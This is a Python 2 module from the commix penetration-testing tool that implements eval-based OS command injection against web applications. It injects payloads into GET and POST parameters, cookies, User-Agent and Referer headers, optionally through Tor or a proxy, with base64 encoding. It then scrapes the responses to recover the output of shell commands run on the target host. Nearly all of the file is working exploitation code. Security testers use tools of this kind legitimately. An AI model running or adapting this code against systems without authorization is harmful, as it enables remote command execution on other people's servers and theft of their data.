#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2
import urlparse

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.eval_based import eb_payloads

"""
 The "eval-based" injection technique on Classic OS Command Injection.
"""

# ------------------------------------
# Check if target host is vulnerable.
# ------------------------------------
def injection_test(payload, http_request_method, url):

  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)

    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
        response = proxy.use_proxy(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    # Check if defined Tor.
    elif menu.options.tor:
      try:
        response = tor.use_tor(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    else:
      try:
        response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        raise SystemExit() 
      
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the POST data
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
  
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
        response = proxy.use_proxy(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    # Check if defined Tor.
    elif menu.options.tor:
      try:
        response = tor.use_tor(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    else:
      try:
        response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        raise SystemExit() 
      
  return response, vuln_parameter

def warning_detection(url, http_request_method):

  # Find the host part
  url_part = url.split("=")[0]
  if http_request_method == "GET" :
  	request = urllib2.Request(url_part)
  else:
  	request = urllib2.Request(url_part,"")
  # Check if defined extra headers.
  headers.do_check(request)
  response = urllib2.urlopen(request)
  html_data = response.read()

  error_msg = ""
  if "eval()'d code" in html_data:
    error_msg = "'eval()'"

  if "Cannot execute a blank command in" in html_data:
    error_msg = "execution of a blank command,"

  if "sh: command substitution:" in html_data:
    error_msg = "command substitution"

  if "Warning: usort()" in html_data:
    error_msg = "'usort()'"

  if re.findall(r"=/(.*)/&", url):
    if "Warning: preg_replace():" in html_data:
      error_msg = "'preg_replace()'"
    url = url.replace("/&","/e&")

  if "Warning: assert():" in html_data:
    error_msg = "'assert()'"

  if "Failure evaluating code:" in html_data:
    error_msg = "code evaluation"
  
  if error_msg != "":
    print Fore.YELLOW + "(^) Warning: A failure message on " + error_msg + " was detected on page's response." + Style.RESET_ALL

  return url

# ------------------------
# Evaluate test results.
# ------------------------
def injection_test_results(response, TAG, randvcalc):
  
  html_data = response.read()
  html_data= re.sub("\n", " ", html_data)
  shell = re.findall(r"" + TAG + " " + str(randvcalc) + " " + TAG + " " + TAG + " " , html_data)
  return shell

# --------------------------------------------------------------
# Check if target host is vulnerable.(Cookie-based injection)
# --------------------------------------------------------------
def cookie_injection_test(url, vuln_parameter, payload):

  def inject_cookie(url, vuln_parameter, payload, proxy):
    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)
    opener.addheaders.append(('Cookie', vuln_parameter + "=" + payload))
    request = urllib2.Request(url)
    # Check if defined extra headers.
    headers.do_check(request)
    response = opener.open(request)
    return response

  proxy = None 
  response = inject_cookie(url, vuln_parameter, payload, proxy)

  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 
  
  return response
 
# ------------------------------------------------------------------
# Check if target host is vulnerable.(User-Agent-based injection)
# ------------------------------------------------------------------
def user_agent_injection_test(url, vuln_parameter, payload):

  def inject_user_agent(url, vuln_parameter, payload, proxy):

    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)

    request = urllib2.Request(url)
    #Check if defined extra headers.
    headers.do_check(request)
    request.add_header('User-Agent', urllib.unquote(payload))
    response = opener.open(request)
    return response

  proxy = None 
  response = inject_user_agent(url, vuln_parameter, payload, proxy)
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 
  

  return response

# ------------------------------------------------------------------
# Check if target host is vulnerable.(Referer-based injection)
# ------------------------------------------------------------------
def referer_injection_test(url, vuln_parameter, payload):

  def inject_referer(url, vuln_parameter, payload, proxy):

    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)

    request = urllib2.Request(url)
    #Check if defined extra headers.
    headers.do_check(request)
    request.add_header('Referer', urllib.unquote(payload))
    response = opener.open(request)
    return response

  proxy = None 
  response = inject_referer(url, vuln_parameter, payload, proxy)
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 
  

  return response


# -------------------------------------------
# The main command injection exploitation.
# -------------------------------------------
def injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter):
  
  # Execute shell commands on vulnerable host.
  payload = eb_payloads.cmd_execution(separator, TAG, cmd)

  # Fix prefixes / suffixes
  payload = parameters.prefixes(payload, prefix)
  payload = parameters.suffixes(payload, suffix)
  # Fixation for specific payload.
  if ")%3B" + urllib.quote(")}") in payload:
    payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))

  if menu.options.base64:
    payload = urllib.unquote(payload)
    payload = base64.b64encode(payload)
  else:
    payload = re.sub(" ", "%20", payload)

  # Check if defined "--verbose" option.
  if menu.options.verbose:
    sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)

  # Check if defined cookie with "INJECT_HERE" tag
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    response = cookie_injection_test(url, vuln_parameter, payload)

   # Check if defined user-agent with "INJECT_HERE" tag
  elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
    response = user_agent_injection_test(url, vuln_parameter, payload)

  # Check if defined referer with "INJECT_HERE" tag
  elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
    response = referer_injection_test(url, vuln_parameter, payload)

  else:
    # Check if defined method is GET (Default).
    if http_request_method == "GET":
      # Check if its not specified the 'INJECT_HERE' tag
      #url = parameters.do_GET_check(url)
      
      target = re.sub(settings.INJECT_TAG, payload, url)
      vuln_parameter = ''.join(vuln_parameter)
      request = urllib2.Request(target)
      
      # Check if defined extra headers.
      headers.do_check(request)        
        
      # Check if defined any HTTP Proxy.
      if menu.options.proxy:
        try:
          response = proxy.use_proxy(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      # Check if defined Tor.
      elif menu.options.tor:
        try:
          response = tor.use_tor(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      else:
        try:
          response = urllib2.urlopen(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
          raise SystemExit() 
        
    else :
      # Check if defined method is POST.
      parameter = menu.options.data
      parameter = urllib2.unquote(parameter)
      
      # Check if its not specified the 'INJECT_HERE' tag
      parameter = parameters.do_POST_check(parameter)
      
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
      
      # Check if defined extra headers.
      headers.do_check(request)
        
      # Check if defined any HTTP Proxy.
      if menu.options.proxy:
        try:
          response = proxy.use_proxy(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      # Check if defined Tor.
      elif menu.options.tor:
        try:
          response = tor.use_tor(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      else:
        try:
          response = urllib2.urlopen(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
          raise SystemExit() 
      
  return response


#-----------------------------
# Command execution results.
#-----------------------------
def injection_results(response, TAG):
  
  # Grab execution results
  html_data = response.read()
  html_data= re.sub("\n", " ", html_data)
  shell = re.findall(r"" + TAG + " " + TAG + "(.*)" + TAG + " " + TAG + "", html_data)
  
  return shell


#eof